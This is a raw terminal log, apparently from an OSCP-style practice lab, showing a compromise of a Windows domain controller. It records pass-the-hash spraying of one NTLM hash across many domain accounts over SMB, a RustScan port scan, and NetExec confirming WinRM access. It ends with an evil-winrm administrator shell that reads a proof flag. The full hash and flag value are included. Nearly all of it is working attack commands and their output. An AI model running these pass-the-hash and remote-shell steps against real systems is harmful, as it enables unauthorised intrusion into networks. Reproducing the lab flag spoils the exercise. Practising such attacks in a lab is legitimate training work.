+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Emily.Bishop:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Lawrence.Kay:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Donna.Johnson:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Luke.Martin:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Chelsea.Byrne:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Sandra.Craig:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Leonard.Morris:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\tom_admin:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\tom.kinney:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\celia.almeda:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\krbtgt:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[31m[-][0m oscp.exam\Guest:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE
+[1m[34mSMB[0m         10.10.197.146   445    DC01             [1m[32m[+][0m oscp.exam\Administrator:59b280ba707d22e3ef0aa587fc29ffe5 [1m[33m(Pwn3d!)[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/AD/Loot[0m]
+└─[1m[34m$[0m rustscan -a 10.10.197.146
+[1m[38;2;0;255;0m.[38;2;0;255;6m-[38;2;0;255;13m-[38;2;0;255;19m-[38;2;0;255;25m-[38;2;0;255;32m.[38;2;0;255;38m [38;2;0;255;45m.[38;2;0;255;51m-[38;2;0;255;57m.[38;2;0;255;64m [38;2;0;255;70m.[38;2;0;255;76m-[38;2;0;255;83m.[38;2;0;255;89m [38;2;0;255;96m.[38;2;0;255;102m-[38;2;0;255;108m-[38;2;0;255;115m-[38;2;0;255;121m-[38;2;0;255;127m.[38;2;0;255;134m.[38;2;0;255;140m-[38;2;0;255;147m-[38;2;0;255;153m-[38;2;0;255;159m.[38;2;0;255;166m [38;2;0;255;172m [38;2;0;255;178m.[38;2;0;255;185m-[38;2;0;255;191m-[38;2;0;255;198m-[38;2;0;255;204m-[38;2;0;255;210m.[38;2;0;255;217m [38;2;0;255;223m.[38;2;0;255;229m-[38;2;0;255;236m-[38;2;0;255;242m-[38;2;0;255;249m.[38;2;0;255;255m [38;2;0;249;255m [38;2;0;242;255m [38;2;0;236;255m.[38;2;0;230;255m-[38;2;0;223;255m-[38;2;0;217;255m.[38;2;0;210;255m [38;2;0;204;255m [38;2;0;198;255m.[38;2;0;191;255m-[38;2;0;185;255m.[38;2;0;179;255m [38;2;0;172;255m.[38;2;0;166;255m-[38;2;0;159;255m.[0m
+[38;2;0;255;0m|[38;2;0;255;6m [38;2;0;255;13m{[38;2;0;255;19m}[38;2;0;255;25m [38;2;0;255;32m [38;2;0;255;38m}[38;2;0;255;45m|[38;2;0;255;51m [38;2;0;255;57m{[38;2;0;255;64m [38;2;0;255;70m}[38;2;0;255;76m [38;2;0;255;83m|[38;2;0;255;89m{[38;2;0;255;96m [38;2;0;255;102m{[38;2;0;255;108m_[38;2;0;255;115m_[38;2;0;255;121m [38;2;0;255;127m{[38;2;0;255;134m_[38;2;0;255;140m [38;2;0;255;147m [38;2;0;255;153m [38;2;0;255;159m_[38;2;0;255;166m}[38;2;0;255;172m{[38;2;0;255;178m [38;2;0;255;185m{[38;2;0;255;191m_[38;2;0;255;198m_[38;2;0;255;204m [38;2;0;255;210m [38;2;0;255;217m/[38;2;0;255;223m [38;2;0;255;229m [38;2;0;255;236m_[38;2;0;255;242m_[38;2;0;255;249m_[38;2;0;255;255m}[38;2;0;249;255m [38;2;0;242;255m/[38;2;0;236;255m [38;2;0;230;255m{[38;2;0;223;255m}[38;2;0;217;255m [38;2;0;210;255m\[38;2;0;204;255m [38;2;0;198;255m|[38;2;0;191;255m [38;2;0;185;255m [38;2;0;179;255m`[38;2;0;172;255m|[38;2;0;166;255m [38;2;0;159;255m|[39m
+[38;2;0;255;0m|[38;2;0;255;6m [38;2;0;255;13m.[38;2;0;255;19m-[38;2;0;255;25m.[38;2;0;255;32m [38;2;0;255;38m\[38;2;0;255;45m|[38;2;0;255;51m [38;2;0;255;57m{[38;2;0;255;64m_[38;2;0;255;70m}[38;2;0;255;76m [38;2;0;255;83m|[38;2;0;255;89m.[38;2;0;255;96m-[38;2;0;255;102m.[38;2;0;255;108m_[38;2;0;255;115m}[38;2;0;255;121m [38;2;0;255;127m}[38;2;0;255;134m [38;2;0;255;140m|[38;2;0;255;147m [38;2;0;255;153m|[38;2;0;255;159m [38;2;0;255;166m [38;2;0;255;172m.[38;2;0;255;178m-[38;2;0;255;185m.[38;2;0;255;191m_[38;2;0;255;198m}[38;2;0;255;204m [38;2;0;255;210m}[38;2;0;255;217m\[38;2;0;255;223m [38;2;0;255;229m [38;2;0;255;236m [38;2;0;255;242m [38;2;0;255;249m [38;2;0;255;255m}[38;2;0;249;255m/[38;2;0;242;255m [38;2;0;236;255m [38;2;0;230;255m/[38;2;0;223;255m\[38;2;0;217;255m [38;2;0;210;255m [38;2;0;204;255m\[38;2;0;198;255m|[38;2;0;191;255m [38;2;0;185;255m|[38;2;0;179;255m\[38;2;0;172;255m [38;2;0;166;255m [38;2;0;159;255m|[39m
+[38;2;0;255;0m`[38;2;0;255;6m-[38;2;0;255;13m'[38;2;0;255;19m [38;2;0;255;25m`[38;2;0;255;32m-[38;2;0;255;38m'[38;2;0;255;45m`[38;2;0;255;51m-[38;2;0;255;57m-[38;2;0;255;64m-[38;2;0;255;70m-[38;2;0;255;76m-[38;2;0;255;83m'[38;2;0;255;89m`[38;2;0;255;96m-[38;2;0;255;102m-[38;2;0;255;108m-[38;2;0;255;115m-[38;2;0;255;121m'[38;2;0;255;127m [38;2;0;255;134m [38;2;0;255;140m`[38;2;0;255;147m-[38;2;0;255;153m'[38;2;0;255;159m [38;2;0;255;166m [38;2;0;255;172m`[38;2;0;255;178m-[38;2;0;255;185m-[38;2;0;255;191m-[38;2;0;255;198m-[38;2;0;255;204m'[38;2;0;255;210m [38;2;0;255;217m [38;2;0;255;223m`[38;2;0;255;229m-[38;2;0;255;236m-[38;2;0;255;242m-[38;2;0;255;249m'[38;2;0;255;255m [38;2;0;249;255m`[38;2;0;242;255m-[38;2;0;236;255m'[38;2;0;230;255m [38;2;0;223;255m [38;2;0;217;255m`[38;2;0;210;255m-[38;2;0;204;255m'[38;2;0;198;255m`[38;2;0;191;255m-[38;2;0;185;255m'[38;2;0;179;255m [38;2;0;172;255m`[38;2;0;166;255m-[38;2;0;159;255m'[39m
+[38;2;0;255;0mT[38;2;0;255;6mh[38;2;0;255;13me[38;2;0;255;19m [38;2;0;255;25mM[38;2;0;255;32mo[38;2;0;255;38md[38;2;0;255;45me[38;2;0;255;51mr[38;2;0;255;57mn[38;2;0;255;64m [38;2;0;255;70mD[38;2;0;255;76ma[38;2;0;255;83my[38;2;0;255;89m [38;2;0;255;96mP[38;2;0;255;102mo[38;2;0;255;108mr[38;2;0;255;115mt[38;2;0;255;121m [38;2;0;255;127mS[38;2;0;255;134mc[38;2;0;255;140ma[38;2;0;255;147mn[38;2;0;255;153mn[38;2;0;255;159me[38;2;0;255;166mr[38;2;0;255;172m.[39m
+[1m[38;2;255;255;0m_[38;2;249;255;0m_[38;2;242;255;0m_[38;2;236;255;0m_[38;2;230;255;0m_[38;2;223;255;0m_[38;2;217;255;0m_[38;2;210;255;0m_[38;2;204;255;0m_[38;2;198;255;0m_[38;2;191;255;0m_[38;2;185;255;0m_[38;2;179;255;0m_[38;2;172;255;0m_[38;2;166;255;0m_[38;2;159;255;0m_[38;2;153;255;0m_[38;2;147;255;0m_[38;2;140;255;0m_[38;2;134;255;0m_[38;2;128;255;0m_[38;2;121;255;0m_[38;2;115;255;0m_[38;2;108;255;0m_[38;2;102;255;0m_[38;2;96;255;0m_[38;2;89;255;0m_[38;2;83;255;0m_[38;2;77;255;0m_[38;2;70;255;0m_[38;2;64;255;0m_[38;2;57;255;0m_[38;2;51;255;0m_[38;2;45;255;0m_[38;2;38;255;0m_[38;2;32;255;0m_[38;2;26;255;0m_[38;2;19;255;0m_[38;2;13;255;0m_[38;2;6;255;0m_[0m
+[38;2;255;255;0m:[38;2;249;255;0m [38;2;242;255;0mh[38;2;236;255;0mt[38;2;230;255;0mt[38;2;223;255;0mp[38;2;217;255;0m:[38;2;210;255;0m/[38;2;204;255;0m/[38;2;198;255;0md[38;2;191;255;0mi[38;2;185;255;0ms[38;2;179;255;0mc[38;2;172;255;0mo[38;2;166;255;0mr[38;2;159;255;0md[38;2;153;255;0m.[38;2;147;255;0ms[38;2;140;255;0mk[38;2;134;255;0me[38;2;128;255;0mr[38;2;121;255;0mr[38;2;115;255;0mi[38;2;108;255;0mt[38;2;102;255;0mt[38;2;96;255;0m.[38;2;89;255;0mb[38;2;83;255;0ml[38;2;77;255;0mo[38;2;70;255;0mg[38;2;64;255;0m [38;2;57;255;0m [38;2;51;255;0m [38;2;45;255;0m [38;2;38;255;0m [38;2;32;255;0m [38;2;26;255;0m [38;2;19;255;0m [38;2;13;255;0m [38;2;6;255;0m:[39m
+[38;2;255;255;0m:[38;2;249;255;0m [38;2;242;255;0mh[38;2;236;255;0mt[38;2;230;255;0mt[38;2;223;255;0mp[38;2;217;255;0ms[38;2;210;255;0m:[38;2;204;255;0m/[38;2;198;255;0m/[38;2;191;255;0mg[38;2;185;255;0mi[38;2;179;255;0mt[38;2;172;255;0mh[38;2;166;255;0mu[38;2;159;255;0mb[38;2;153;255;0m.[38;2;147;255;0mc[38;2;140;255;0mo[38;2;134;255;0mm[38;2;128;255;0m/[38;2;121;255;0mR[38;2;115;255;0mu[38;2;108;255;0ms[38;2;102;255;0mt[38;2;96;255;0mS[38;2;89;255;0mc[38;2;83;255;0ma[38;2;77;255;0mn[38;2;70;255;0m/[38;2;64;255;0mR[38;2;57;255;0mu[38;2;51;255;0ms[38;2;45;255;0mt[38;2;38;255;0mS[38;2;32;255;0mc[38;2;26;255;0ma[38;2;19;255;0mn[38;2;13;255;0m [38;2;6;255;0m:[39m
+[38;2;255;255;0m [38;2;249;255;0m-[38;2;242;255;0m-[38;2;236;255;0m-[38;2;230;255;0m-[38;2;223;255;0m-[38;2;217;255;0m-[38;2;210;255;0m-[38;2;204;255;0m-[38;2;198;255;0m-[38;2;191;255;0m-[38;2;185;255;0m-[38;2;179;255;0m-[38;2;172;255;0m-[38;2;166;255;0m-[38;2;159;255;0m-[38;2;153;255;0m-[38;2;147;255;0m-[38;2;140;255;0m-[38;2;134;255;0m-[38;2;128;255;0m-[38;2;121;255;0m-[38;2;115;255;0m-[38;2;108;255;0m-[38;2;102;255;0m-[38;2;96;255;0m-[38;2;89;255;0m-[38;2;83;255;0m-[38;2;77;255;0m-[38;2;70;255;0m-[38;2;64;255;0m-[38;2;57;255;0m-[38;2;51;255;0m-[38;2;45;255;0m-[38;2;38;255;0m-[38;2;32;255;0m-[38;2;26;255;0m-[38;2;19;255;0m-[38;2;13;255;0m-[39m
+I scanned my computer so many times, it thinks we're dating.
+[1m[34m[~][0m The config file is expected to be at "/home/sk4t4/.rustscan.toml"
+[1m[31m[!][0m File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+[1m[31m[!][0m Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
+Open [35m10.10.197.146:53[39m
+Open [35m10.10.197.146:135[39m
+Open [35m10.10.197.146:88[39m
+Open [35m10.10.197.146:139[39m
+Open [35m10.10.197.146:389[39m
+Open [35m10.10.197.146:445[39m
+Open [35m10.10.197.146:464[39m
+Open [35m10.10.197.146:593[39m
+Open [35m10.10.197.146:636[39m
+Open [35m10.10.197.146:3268[39m
+Open [35m10.10.197.146:3269[39m
+Open [35m10.10.197.146:5985[39m
+^C
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/AD/Loot[0m]
+└─[1m[34m$[0m nxc winrm 10.10.197.146 -u Administrator -H 59b280ba707d22e3ef0aa587fc29ffe5
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[34m[*][0m Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:oscp.exam)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.haz
+mat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[1m[34mWINRM[0m       10.10.197.146   5985   DC01             [1m[32m[+][0m oscp.exam\Administrator:59b280ba707d22e3ef0aa587fc29ffe5 [1m[33m(Pwn3d!)[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/AD/Loot[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/AD/Loot[0m]
+└─[1m[34m$[0m evil-winrm -i 10.10.197.146 -u Administrator -H 59b280ba707d22e3ef0aa587fc29ffe5
+[34mEvil-WinRM shell v3.9[39m
+[1m[33mWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline[0m
+[35mData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion[39m
+[34mInfo: Establishing connection to remote endpoint[39m
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\Administrator\Documents> whoami
+oscp\administrator
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\Administrator\Documents> ipconfig
+Windows IP Configuration
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . :
+   IPv4 Address. . . . . . . . . . . : 10.10.197.146
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.197.254
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\proof.txt
+a71de2dbe245f2d64d1a1e580024662b
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\Administrator\Documents> exit
+[34mInfo: Exiting with code 0[39m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/AD/Loot[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_B/AD/Loot[0m]
+└─[1m[34m$[0m exit
